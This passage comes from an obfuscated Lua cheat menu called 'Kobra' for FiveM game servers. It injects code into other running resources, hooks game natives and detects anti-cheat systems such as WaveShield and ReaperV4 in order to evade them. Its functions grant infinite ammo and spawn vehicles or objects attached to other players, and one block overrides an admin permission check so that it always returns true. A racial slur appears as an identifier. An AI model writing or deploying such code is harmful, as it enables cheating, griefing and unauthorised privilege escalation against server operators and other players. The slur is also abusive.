                    _G.KobraFreecamEnabled = false
                    _G.KobraFreecamThreadRunning = false

                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                    hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                    hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                    hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                    hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                    RenderScriptCams(false, false, 0, true, true)
                    if _G.KobraFreecamObject then DestroyCam(_G.KobraFreecamObject, false) _G.KobraFreecamObject = nil end
                    SetFocusEntity(PlayerPedId())
                ]]);end else local v682=0 + 0 ;while true do if (v682==(15 -8)) then hNative("IsEntityAVehicle",function(v970,...) return v970(...);end);hNative("TaskWarpPedIntoVehicle",function(v971,...) return v971(...);end);hNative("SetEntityCoords",function(v972,...) return v972(...);end);hNative("GiveWeaponToPed",function(v973,...) return v973(...);end);hNative("SetCurrentPedWeapon",function(v974,...) return v974(...);end);v682=6 + 2 ;end if ((24 -16)==v682) then hNative("ShootSingleBulletBetweenCoords",function(v975,...) return v975(...);end);RenderScriptCams(false,false,0 -0 ,true,true);if _G.KobraFreecamObject then DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;end SetFocusEntity(PlayerPedId());break;end if ((438 -(279 + 154))==v682) then hNative("GetCamCoord",function(v976,...) return v976(...);end);hNative("GetCamRot",function(v977,...) return v977(...);end);hNative("IsControlPressed",function(v978,...) return v978(...);end);hNative("GetDisabledControlNormal",function(v979,...) return v979(...);end);hNative("TaskStandStill",function(v980,...) return v980(...);end);v682=784 -(454 + 324) ;end if ((4 + 0)==v682) then hNative("SetTextCentre",function(v981,...) return v981(...);end);hNative("SetTextColour",function(v982,...) return v982(...);end);hNative("BeginTextCommandDisplayText",function(v983,...) return v983(...);end);hNative("AddTextComponentSubstringPlayerName",function(v984,...) return v984(...);end);hNative("EndTextCommandDisplayText",function(v985,...) return v985(...);end);v682=22 -(12 + 5) ;end if (v682==(4 + 2)) then hNative("SetFocusPosAndVel",function(v986,...) return v986(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v987,...) return v987(...);end);hNative("GetShapeTestResult",function(v988,...) return v988(...);end);hNative("IsControlJustPressed",function(v989,...) return v989(...);end);hNative("IsDisabledControlJustPressed",function(v990,...) return v990(...);end);v682=17 -10 ;end if (v682==(1 + 0)) then hNative("IsVehicleSeatFree",function(v991,...) return v991(...);end);hNative("PlayerPedId",function(v992,...) return v992(...);end);hNative("GetEntityCoords",function(v993,...) return v993(...);end);hNative("CreateCam",function(v994,...) return v994(...);end);hNative("SetCamCoord",function(v995,...) return v995(...);end);v682=2;end if (v682==(1096 -(277 + 816))) then hNative("SetTextProportional",function(v996,...) return v996(...);end);hNative("SetTextScale",function(v997,...) return v997(...);end);hNative("SetTextDropShadow",function(v998,...) return v998(...);end);hNative("SetTextEdge",function(v999,...) return v999(...);end);hNative("SetTextOutline",function(v1000,...) return v1000(...);end);v682=17 -13 ;end if ((1183 -(1058 + 125))==v682) then _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function hNative(v1001,v1002) local v1003=0 + 0 ;local v1004;while true do if (v1003==(975 -(815 + 160))) then v1004=_G[v1001];if ( not v1004 or (type(v1004)~="function")) then return;end v1003=1;end if (v1003==(4 -3)) then _G[v1001]=function(...) return v1002(v1004,...);end;break;end end end hNative("CreateThread",function(v1005,...) return v1005(...);end);hNative("Wait",function(v1006,...) return v1006(...);end);v682=2 -1 ;end if (v682==2) then hNative("SetCamRot",function(v1007,...) return v1007(...);end);hNative("RenderScriptCams",function(v1008,...) return v1008(...);end);hNative("DestroyCam",function(v1009,...) return v1009(...);end);hNative("SetFocusEntity",function(v1010,...) return v1010(...);end);hNative("SetTextFont",function(v1011,...) return v1011(...);end);v682=1 + 2 ;end end end end end;v12.EnableInfiniteAmmo=function(v196) if (GetResourceState("WaveShield")=="started") then local v511=0 -0 ;local v512;local v513;local v514;local v515;local v516;local v517;local v518;local v519;local v520;local v521;local v522;while true do if (v511==0) then print("1");v512=nil;function v512(v838) local v839="";for v920=1, #v838 do v839=v839   .. string.char(v838[v920]) ;end return v839;end v511=1899 -(41 + 1857) ;end if (4==v511) then v519=v513({68,111,101,1889 -(1111 + 663) ,10 + 59 ,76 + 34 ,4 + 112 ,105,19 + 97 ,575 -(233 + 221) ,69,106 + 14 ,1646 -(718 + 823) ,115,116});v520=v513({892 -(266 + 539) ,1322 -(636 + 589) ,216 -111 ,116});v521={};v511=2 + 3 ;end if (v511==5) then v522=nil;function v522(v840) local v841=coroutine.create(v840);local function v842() while coroutine.status(v841)~="dead"  do local v1012,v1013=coroutine.resume(v841);if  not v1012 then print("^1[Kobra InfAmmo] Coroutine error: ^7",v1013);break;end v520(1015 -(657 + 358) );end end v842();end if  not _G.osintWaveLoop then _G.osintWaveLoop=true;v522(function() while _G.osintWaveLoop do local v1102=0;while true do if (v1102==0) then if _G.osintInfAmmo.enabled then local v1319=0;local v1320;while true do if (v1319==0) then v1320=v514();if v519(v1320) then local v1515=v515(v1320);if (v1515 and (v1515~=v516("WEAPON_UNARMED"))) then local v1607=0;local v1608;local v1609;local v1610;while true do if (v1607==(2 -1)) then if  not v521[v1610] then v521[v1610]=v1609;end if (v1609<v521[v1610]) then v518(v1320,v1515,v521[v1610] -v1609 );end break;end if (v1607==(0 -0)) then v1608,v1609=v517(v1320,v1515);v1610=tostring(v1320);v1607=1188 -(1151 + 36) ;end end end end break;end end else coroutine.yield();end coroutine.yield();break;end end end end);end break;end if (v511==(3 + 0)) then v516=v513({212 -141 ,1933 -(1552 + 280) ,79 + 37 ,13 + 59 ,193 -96 ,175 -60 ,923 -(599 + 220) ,2006 -(1813 + 118) ,1318 -(841 + 376) ,29 + 92 });v517=v513({71,101,297 -181 ,902 -(467 + 370) ,109,373 -264 ,258 -147 ,73,270 -160 ,57 + 23 ,491 -(14 + 376) ,65 + 35 ,83 + 4 ,295 -194 ,97,112,111,110});v518=v513({59 + 6 ,32 + 68 ,100,173 -108 ,1977 -(708 + 1160) ,198 -89 ,111,19 + 65 ,1843 -(1400 + 332) ,80,2009 -(242 + 1666) ,37 + 63 });v511=4;end if (v511==(2 + 0)) then _G.osintInfAmmo.enabled=true;v514=v513({140 -60 ,108,86 + 11 ,166 -45 ,1324 -(109 + 1114) ,114,322 -(6 + 236) ,82 + 19 ,174 -74 ,73,17 + 83 });v515=v513({71,90 + 11 ,62 + 54 ,490 -(174 + 233) ,177 -76 ,1282 -(663 + 511) ,101,99,71 + 45 ,244 -143 ,194 -94 ,8 + 72 ,101,617 -(440 + 77) ,40 + 47 ,1657 -(655 + 901) ,18 + 79 ,112,447 -336 ,110});v511=1448 -(695 + 750) ;end if (v511==1) then v513=nil;function v513(v843) return _G[v512(v843)];end if  not _G.osintInfAmmo then _G.osintInfAmmo={enabled=false};end v511=2;end end elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);end end;v12.DisableInfiniteAmmo=function(v197) if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            if _G.osintInfAmmo then
                _G.osintInfAmmo.enabled = false
            end
        ]]);elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);end end;v12.AttachSelectedVehicle=function(v198,v199,v200) if ( not v199 or ( #v199==0)) then local v523=0;while true do if (v523==0) then v198:Notify("error","Kobra","No players selected!",3000);return;end end end if ( not v200 or ( #v200==(0 -0))) then v198:Notify("error","Kobra","Invalid vehicle model!",4629 -1629 );return;end local function v201(v317) local v318=0;local v319;while true do if (0==v318) then v319={};for v763=3 -2 , #v317 do v319[v763]=string.byte(v317,v763);end v318=352 -(285 + 66) ;end if (v318==1) then return table.concat(v319,",");end end end local v202=v200;local v203=v201(v202);local v204=GetCurrentServerEndpoint();local v205=0 -0 ;for v320,v321 in ipairs(v199) do if (GetResourceState("solos-rentals")=="started") then print("[vehicle_attach] Fallback: solos-rentals");local v586,v587=pcall(function() MachoInjectResource("solos-rentals",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    config.locations["customnigga"] = {
                        vehiclespawncoords = vec4(coords.x, coords.y, coords.z, heading)
                    }
                    TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga", function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v203,v321));end);if v586 then v205=v205 + 1 ;end elseif (GetResourceState("amigo")=="started") then local v765=0;local v766;local v767;while true do if (v765==0) then print("[vehicle_attach] Fallback: Amigo RP");v766,v767=pcall(function() MachoInjectResourceRaw("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v203,v321));end);v765=1311 -(682 + 628) ;end if (v765==(1 + 0)) then if v766 then v205=v205 + (300 -(176 + 123)) ;end break;end end elseif (GetResourceState("qb-core")=="started") then print("[vehicle_attach] Fallback #02");local v921,v922=pcall(function() MachoInjectResource("qb-core",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    QBCore.Functions.SpawnVehicle(model, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end, coords, true, true)
                ]],v203,v321));end);if v921 then v205=v205 + 1 ;end elseif ((v204:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then print("[vehicle_attach] Fallback #1");local v1103,v1104=pcall(function() MachoInjectResource("drc_gardener",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    SpawnVehicleAndWarpPlayer(model, coords)
                ]],v203,v321));end);if v1103 then v205=v205 + 1 + 0 ;end elseif (GetResourceState("lunar_bridge")=="started") then local v1192=0;local v1193;local v1194;while true do if (v1192==1) then if v1193 then v205=v205 + 1 + 0 ;end break;end if (v1192==(269 -(239 + 30))) then print("[vehicle_attach] Fallback #2");v1193,v1194=pcall(function() MachoInjectResourceRaw("lunar_bridge",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    Framework.spawnVehicle(model, coords, heading, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            SetVehicleOnGroundProperly(vehicle)
                            Citizen.Wait(500)
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v203,v321));end);v1192=1;end end elseif (GetResourceState("lation_laundering")=="started") then print("[vehicle_attach] Fallback #3");local v1251,v1252=pcall(function() MachoInjectResourceRaw("lation_laundering",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local position = vector4(coords.x, coords.y, coords.z + 0.5, heading)
                    local vehicle = SpawnVehicle(model, position)
                    if vehicle and DoesEntityExist(vehicle) then
                        SetVehicleOnGroundProperly(vehicle)
                        Citizen.Wait(500)
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        ShowNotification("~g~Vehicle attached successfully!")
                    end
                ]],v203,v321));end);if v1251 then v205=v205 + 1 ;end else local v1253=0 + 0 ;local v1254;local v1255;while true do if ((0 + 0)==v1253) then print("[vehicle_attach] Universal Fallback");v1254,v1255=pcall(function() local v1394=0;local v1395;while true do if (v1394==(0 -0)) then v1395=string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    RequestModel(model)
                    local maxAttempts = 20
                    local attempts = 0
                    while not HasModelLoaded(model) and attempts < maxAttempts do
                        Citizen.Wait(500)
                        attempts = attempts + 1
                    end
                    if attempts >= maxAttempts then return end
                    
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local vehicle = CreateVehicle(model, coords.x, coords.y, coords.z, heading, true, true)
                    if vehicle and DoesEntityExist(vehicle) then
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        SetModelAsNoLongerNeeded(model)
                    end
                ]],v203,v321);MachoInjectResourceRaw("any",v1395,v321);break;end end end);v1253=2 -1 ;end if (v1253==(316 -(306 + 9))) then if v1254 then v205=v205 + (3 -2) ;end break;end end end end end;function encodeToByteArrayLiteral(v206) local v207=0;local v208;while true do if (v207==1) then if ( #v206==(0 + 0)) then return "";end v208={};v207=2 + 0 ;end if (2==v207) then for v683=1, #v206 do v208[ #v208 + 1 ]=tostring(string.byte(v206,v683));end return table.concat(v208,", ");end if ((0 + 0)==v207) then if  not v206 then return "";end if (type(v206)~="string") then return tostring(v206);end v207=2 -1 ;end end end v12.SpawnSelectedObject=function(v209,v210) if ( not v210 or ( #v210==0)) then local v524=1375 -(1140 + 235) ;while true do if (v524==0) then v209:Notify("error","Kobra","No players selected!",1910 + 1090 );return;end end end local v211=v209:GetSelectedObjectModel();if ( not v211 or ( #v211==(0 + 0))) then local v525=0;while true do if (v525==(0 + 0)) then v209:Notify("error","Kobra","Invalid object model!",3052 -(33 + 19) );return;end end end local v212=encodeToByteArrayLiteral(v211);local v213=0 + 0 ;for v322,v323 in ipairs(v210) do if ((GetResourceState("qb-core")=="started") or ((GetResourceState("mc9-core")=="started") and ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started") or (GetResourceState("ReaperV4")=="started") or (GetResourceState("WaveShield")=="started")))) then local v588=0 -0 ;while true do if ((0 + 0)==v588) then v209:Notify("error","Kobra","Using Qb-core Spawner!",5883 -2883 );MachoInjectResource("qb-core",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and joaat(model) or model
                QBCore.Functions.LoadModel(hash)
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]],v212,v323));v588=1 + 0 ;end if (v588==(690 -(586 + 103))) then v213=v213 + 1 ;break;end end elseif (GetResourceState("cd_dispatch")=="started") then print("using fallback");MachoInjectResource("cd_dispatch",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                
                -- Hook CreateObject to override hash and ensure model loading
                local originalCreateObject = CreateObject
                CreateObject = function(objHash, x, y, z, dynamic, placeOnGround, p7)
                    if type(objHash) == 'number' and objHash ~= hash then
                        -- Override with our custom hash for this spawn
                        objHash = hash
                    end
                    RequestModel(objHash)
                    while not HasModelLoaded(objHash) do
                        Citizen.Wait(0)
                    end
                    local obj = originalCreateObject(objHash, x, y, z, dynamic, placeOnGround, p7)
                    SetModelAsNoLongerNeeded(objHash)
                    return obj
                end
                
                -- Spawn the object on target player
                local player = GetPlayerFromServerId(%d)
                if player == -1 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                end
                
                -- Restore original CreateObject
                CreateObject = originalCreateObject
            ]],v212,v323));v213=v213 + 1 ;elseif (GetResourceState("rcore_drunk")=="started") then local v923=0;while true do if ((0 + 0)==v923) then MachoInjectResourceRaw("rcore_drunk",string.format([[
                local model = "%s"
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local hash = GetHashKey(model)
                RequestModel(hash)
                while not HasModelLoaded(hash) do Citizen.Wait(0) end
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
            ]],v211,v323));v213=v213 + (2 -1) ;break;end end elseif (GetResourceState("lc_fuel")=="started") then local v1105=1488 -(1309 + 179) ;while true do if (v1105==(0 -0)) then MachoInjectResourceRaw("lc_fuel",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    Config.NozzleProps.gas = model
                    local entity = createFuelNozzleObject()
                    SetEntityCoords(entity, coords)
                end
                spawnObj()
            ]],v211,v323));v213=v213 + 1 + 0 ;break;end end elseif (GetResourceState("0r-illegalpack")=="started") then local v1195=0;while true do if (v1195==(0 -0)) then MachoInjectResourceRaw("0r-illegalpack",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local entity = Utils.createObject(model, coords, vec3(0.0, 0.0, 0.0), true, true, false)
                end
                spawnObj()
            ]],v211,v323));v213=v213 + 1 + 0 ;break;end end elseif (GetResourceState("xradio")=="started") then local v1256=0 -0 ;while true do if ((0 -0)==v1256) then MachoInjectResourceRaw("xradio",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    CreateRadioObject(model, coords, function(entity)
                        print(entity)
                    end)
                end
                spawnObj()
            ]],v211,v323));v213=v213 + (610 -(295 + 314)) ;break;end end else MachoInjectResourceRaw("any",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                RequestModel(hash)
                local attempts = 0
                while not HasModelLoaded(hash) and attempts < 20 do
                    Citizen.Wait(100)
                    attempts = attempts + 1
                end
                if attempts >= 20 then return end
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
